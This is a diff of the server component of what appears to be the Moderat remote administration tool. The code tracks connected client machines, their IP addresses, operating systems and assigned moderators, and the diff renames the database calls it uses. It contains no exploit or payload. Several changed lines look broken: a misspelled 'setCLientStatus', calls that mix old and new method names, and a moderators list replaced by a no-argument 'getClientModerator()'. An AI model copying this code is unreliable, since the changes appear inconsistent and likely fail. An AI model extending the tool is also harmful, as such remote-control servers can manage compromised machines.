@@ -2,7 +2,6 @@ import ast
 import logging
 import coloredlogs
 import os
-import datetime
 
 from twisted.internet.protocol import ServerFactory
 from twisted.internet import task
@@ -37,7 +36,7 @@ class ModeratServerProtocol(LineReceiver):
         # Delete Socket Entry
         for key, value in self.factory.clients.items():
             if value['socket'] == self:
-                self.factory.database.set_client_offline(key)
+                self.factory.database.setCLientStatus(key, False)
                 del self.factory.clients[key]
                 self.factory.log.warning('[CLIENT] Client (%s) Disconnected' % (value['key'] if value.has_key('key') else 'UNKNOWN'))
 
@@ -115,14 +114,14 @@ class ModeratServerProtocol(LineReceiver):
 
                 if self.factory.database.getPrivileges(moderator_username) == 1:
                     clients_ids = []
-                    temp_clients_ids = self.factory.database.get_all_clients()
+                    temp_clients_ids = self.factory.database.getAllClients()
                     for client_id in temp_clients_ids:
                         _id = client_id[0]
-                        if self.factory.database.get_privs(self.factory.database.get_moderator(
-                                _id)) == 0 or moderator_username == self.factory.database.get_moderator(_id):
+                        if self.factory.database.getPrivileges(self.factory.database.getModerator(
+                                _id)) == 0 or moderator_username == self.factory.database.getClientModerator(_id):
                             clients_ids.append(client_id)
                 else:
-                    clients_ids = self.factory.database.get_clients(moderator_username)
+                    clients_ids = self.factory.database.getClients(moderator_username)
                 shared_clients = {}
 
                 # for online clients
@@ -131,8 +130,8 @@ class ModeratServerProtocol(LineReceiver):
                     # Online Clients
                     if self.factory.clients.has_key(_id) and self.factory.clients[_id].has_key('os_type'):
                         shared_clients[_id] = {
-                            'moderator': self.factory.database.get_moderator(_id),
-                            'alias': self.factory.database.get_alias(_id),
+                            'moderator': self.factory.database.getClientModerator(_id),
+                            'alias': self.factory.database.getClientAlias(_id),
                             'ip_address': self.factory.clients[_id]['ip_address'],
                             'os_type': self.factory.clients[_id]['os_type'],
                             'os': self.factory.clients[_id]['os'],
@@ -155,11 +154,11 @@ class ModeratServerProtocol(LineReceiver):
                     # Offline Clients
                     else:
                         shared_clients[_id] = {
-                            'moderator': self.factory.database.get_moderator(_id),
+                            'moderator': self.factory.database.getClientModerator(_id),
                             'key': _id,
-                            'alias': self.factory.database.get_alias(_id),
-                            'ip_address': self.factory.database.get_ip_address(_id),
-                            'last_online': self.factory.database.get_last_online(_id),
+                            'alias': self.factory.database.getClientAlias(_id),
+                            'ip_address': self.factory.database.getClientIPAddress(_id),
+                            'last_online': self.factory.database.getClientLastOnline(_id),
                             'status': False
                         }
                 self.send_message(self, shared_clients, 'getClients')
@@ -299,7 +298,7 @@ class ModeratServerProtocol(LineReceiver):
 
             # Get Moderators List
             elif mode == 'getModerators' and self.factory.database.get_privs(moderator_username) == 1:
-                all_moderators = self.factory.database.get_moderators()
+                all_moderators = self.factory.database.getClientModerator()
                 result = {}
                 for moderator in all_moderators:
                     all_clients_count = len(self.factory.database.get_clients(moderator[0]))
